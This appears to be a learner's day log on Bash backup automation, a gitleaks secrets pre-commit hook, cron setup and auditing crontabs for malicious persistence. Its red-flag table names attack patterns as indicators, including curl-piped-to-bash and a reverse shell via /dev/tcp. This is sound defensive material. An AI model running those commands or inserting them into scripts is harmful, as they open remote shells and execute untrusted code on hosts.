# Day 05 — Bash II, Automation & Secrets Hygiene

## Security thread
**Auditing crontabs and what malicious persistence looks like.** Scheduled
execution is a favourite attacker persistence mechanism: code that re-establishes
access every few minutes, survives reboots, and outlives your cleanup. The
defensive twin is knowing every scheduled-execution path on a host and being able
to attribute each entry to a package or a documented job.

---

## Part 1 — Production `backup.sh`

A backup script becomes *production* when it has three properties beyond "it
makes an archive":

| Property | Implementation | Why it matters |
|---|---|---|
| **Rotation** | `find -printf '%T@ %p' \| sort -rn \| tail -n +6 \| cut \| xargs -r rm -f` | Bounded disk use — no 3 a.m. disk-full outage |
| **Logging** | `log() { echo "[$(date -Is)] $*" \| tee -a "$LOGFILE"; }` | Evidence trail; `tee` writes to log *and* stdout so cron captures it |
| **Failure alerting** | `trap 'log "ERROR: backup FAILED at line $LINENO"; exit 1' ERR` | You learn about breakage *before* you need the restore |

Plus **verification** — the step most scripts omit:
```bash
tar tzf "$ARCHIVE" > /dev/null || { log "ERROR: verification failed"; exit 1; }
```

**The classic disaster this prevents:** not "we had no backups" but "backups had
been silently failing for months." `tar ... | gzip > out.gz` exits 0 even when
`tar` dies, producing a valid-looking empty archive. Without `pipefail` +
verification + alerting, a backup is a *compliance artifact*, not a recovery
capability.

### Guards (from Day 4)
- `SOURCE_DIR="${1:?usage: backup.sh <source-dir> [backup-root]}"` — required arg
- `BACKUP_ROOT="${2:-/tmp/backups}"` — **optional** arg with default (`:-` vs `:?`)
- `[[ -d "$SOURCE_DIR" ]]` validation before any work
- `tar -C "$SOURCE_DIR" .` → relative paths in the archive, so extraction can't
  clobber real directories

### Evidence
- 15 runs → **exactly 5 archives retained** (rotation proven empirically)
- Empty arg → refused by `${1:?}`; `/nonexistent` → rejected by `[[ -d ]]`
- **ERR trap tested by deliberately breaking tar** → logged
  `ERROR: backup FAILED at line 31` and exited non-zero.
  *An alerting path you have never seen fire is a path you do not know works.*

### Judgment call recorded
shellcheck raised SC2012 (info) on `ls`-based rotation. Chose to **fix with
`find`** rather than suppress. Knowing when to fix a finding versus document a
suppression (`# shellcheck disable=SC2012  # reason`) is part of the review skill.

---

## Part 2 — gitleaks secrets gate

### Install with integrity verification (CC6.8)
gitleaks v8.30.1, downloaded as a raw binary and **checksum-verified before
trusting it**:
```bash
curl -sSL -o gitleaks.tar.gz \
  https://github.com/gitleaks/gitleaks/releases/download/v8.30.1/gitleaks_8.30.1_linux_x64.tar.gz
sha256sum gitleaks.tar.gz    # matched 551f6fc8...2470eb (confirmed against release page)
```
Same principle as the Day-1 Docker GPG key, one layer down: apt verifies
signatures automatically, but when *you* download a binary and place it in `PATH`
as root, **you are the verification step**.

### Pre-commit hook (fail-closed)
`.git/hooks/pre-commit` — a non-zero exit aborts the commit:
```bash
if ! command -v gitleaks >/dev/null 2>&1; then
  echo "pre-commit: gitleaks not found — refusing to commit unscanned" >&2
  exit 1
fi
if ! git diff --cached | gitleaks stdin --verbose; then
  echo "COMMIT BLOCKED: potential secret detected in staged changes." >&2
  exit 1
fi
```
**Fail-closed matters:** if gitleaks goes missing the hook *blocks* rather than
waving commits through. A control that silently disables itself when its
dependency disappears is worse than no control — you believe you're protected.

### CLI note (v8.19+)
Most tutorials online are stale. Current syntax:
`gitleaks detect` → **`gitleaks git`** · `gitleaks detect --no-git -s .` →
**`gitleaks dir`** · `gitleaks protect --staged` → **`git diff --cached | gitleaks stdin`**.
Also: `gitleaks git` takes the repo as a *positional* argument, not `-s`.

### KEY LESSON — know what your scanner misses
A planted `AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/...` was **NOT detected**.
Why: an AWS *secret* key is 40 chars of base64 — structurally identical to a hash,
a session ID, or any base64 blob. A rule for that shape would fire constantly and
get disabled. gitleaks detects secrets with **self-identifying prefixes**:
`AKIA…`, `ghp_…`, `xoxb-…`, `-----BEGIN … PRIVATE KEY-----`.

Retest with matching payloads → **COMMIT BLOCKED**, two independent findings:
`RuleID: private-key` (entropy 4.86) and `RuleID: github-pat` (entropy 4.77).

**Generalisable principle:** every detection tool trades sensitivity against
false-positive rate. Knowing what a scanner *does not* catch matters as much as
knowing what it does. "We installed gitleaks so secrets are covered" is false —
raw AWS secret keys, DB passwords, and unprefixed API tokens pass straight
through unless you write contextual custom rules. (Applies again at Day 56 SAST
gate placement and Day 73 vuln triage.)

### Limitation to state honestly in any report
`.git/hooks/` is **not version-controlled** and does not travel with a clone;
`git commit --no-verify` bypasses it. So:
> *Local pre-commit hooks reduce accidental leaks; they do not prevent deliberate
> ones and must be paired with CI-side scanning.*

Server-side enforcement comes in Phase 4. Partial team fix: commit a `hooks/`
directory and `git config core.hooksPath hooks`.

**Defence in depth:** `.gitignore` (Day 1) blocks whole *files* (`.env`, `*.pem`,
tfstate); gitleaks catches secrets *pasted inline* into otherwise-legitimate
files. Different failure modes, both required.

### Repo state
`gitleaks git .` → 4 commits scanned, **no leaks found**.

---

## Part 3 — cron, and the environment trap

### Installed job
```
0 2 * * * /usr/bin/env bash /home/bassam/bash-lab/backup.sh \
          /home/bassam/bash-lab/testlogs >> /tmp/backups/cron.log 2>&1
```
Fields: `minute hour day-of-month month day-of-week`. `>> log 2>&1` appends stdout
**and** stderr — without it cron output goes nowhere (or to unread local mail),
which is exactly the "no audit trail" finding from Day 3.

**Verified by running it under cron**, not just in a shell — confirmed in
`cron.log` with a full successful cycle.

### The environment trap (→ PATH hijacking)
Cron does **not** load `~/.bashrc` or `~/.profile`. `$PATH` is typically only
`/usr/bin:/bin`, `$HOME` may differ, and the working directory is not yours.
Consequences:
- **Use absolute paths** — relative paths break under cron's cwd
- Binaries in `/usr/local/bin` (e.g. gitleaks) **may not be found** — a script that
  works interactively fails silently at 2 a.m.
- A script relying on an inherited `$PATH` runs whatever binary appears **first**
  in it → **PATH hijacking**. Defence: set `PATH=` explicitly at the top of the
  script/crontab, or call binaries by absolute path.

### Full scheduled-execution inventory (the audit sweep)
```bash
crontab -l                                    # current user
sudo crontab -l                               # root
sudo cat /etc/crontab                         # system-wide
sudo ls -la /etc/cron.d/                      # drop-ins (common hiding spot)
sudo ls -la /etc/cron.{hourly,daily,weekly,monthly}/
sudo ls -la /var/spool/cron/crontabs/         # every user's crontab
systemctl list-timers --all                   # don't forget timers
dpkg -S <file>                                # attribute a job to a package
```

### Red flags (malicious persistence)
| Indicator | Why it's suspicious |
|---|---|
| `curl http://… \| bash` / `wget … \| sh` | Executes remote code on a schedule; payload can change any time |
| base64/hex-decoded commands piped to a shell | Obfuscation — no legitimate reason in a cron line |
| `@reboot` entries | Runs on every boot — classic persistence |
| Paths in `/tmp`, `/dev/shm`, `/var/tmp` | World-writable staging areas; real jobs live in `/opt`, `/usr/local/bin` |
| `/etc/cron.d/` file no package owns (`dpkg -S`) | Unattributable scheduled execution |
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | Reverse shell |
| Root job writable by non-root | Anyone can edit it → cron runs their code **as root** |

### Sweep result on this host: clean
Root has no crontab; `/etc/crontab` holds only standard `run-parts` entries;
`cron.daily` contains only package-owned scripts (apport, apt-compat, dpkg,
logrotate, man-db); hourly/monthly empty; 13 systemd timers, all distro-standard
plus `healthmon.timer`. No `curl|bash`, no encoding, no `@reboot`, nothing in
`/tmp`.

### Day-2 callback observed in production
`/var/spool/cron/crontabs/` is `drwx-wx--T` (**1730**, root:crontab):
- group **write+execute, no read** → users can create their own crontab but
  **cannot list other users'** crontabs
- **sticky bit (`T`)** → a user can delete only *their own* crontab file
- individual crontabs are `-rw-------` (owner only)

This is Debian's cron spool using the exact setgid/sticky/least-privilege pattern
built by hand on Day 2 — in production, for real reasons.

---

## Root-cron review checklist (reusable — productizable for Adwen)
Root + unattended + repeating = every weakness is auto-exploited on a timer.
1. **Who can write the script and its parent dirs?** Non-root writable → cron runs
   their edits as root = instant privilege escalation.
2. **Are variables guarded and quoted?** Unset/empty var in an `rm` as root = the
   Steam bug with root privileges.
3. **Absolute paths or explicit `PATH`?** Otherwise PATH hijacking.
4. **What untrusted input does it consume?** `eval`, `curl|bash`, unquoted
   `$(cat file)`, `sh -c "...$var..."` — keep untrusted data in the *data*
   position, never the *code* position.
5. **Where do output and errors go; does it fail safely?** No logging = silent
   compromise or silent failure.

---

## SOC 2 mapping
- Backup with verification, rotation, alerting → **A1.2** (availability /
  recoverability) and **CC7.2** (monitored, logged operations)
- gitleaks checksum-verified install + secrets pre-commit gate → **CC6.8**
  (prevention of unauthorized/malicious software and credential exposure)
- Scheduled-execution inventory with attribution → **CC7.1** (detecting
  unauthorized change) and **CC6.1** (least privilege on scheduled jobs)
- Version-controlled scripts, reviewed and linted → **CC8.1** (change management)

## Artifacts
- `day-05-scripts/backup.sh` — production backup (rotation, logging, verification, ERR trap)
- `day-05-scripts/pre-commit` — copy of the installed gitleaks hook (hooks aren't versioned by git)
- `day-05-scripts/crontab-entry.txt` — the installed cron line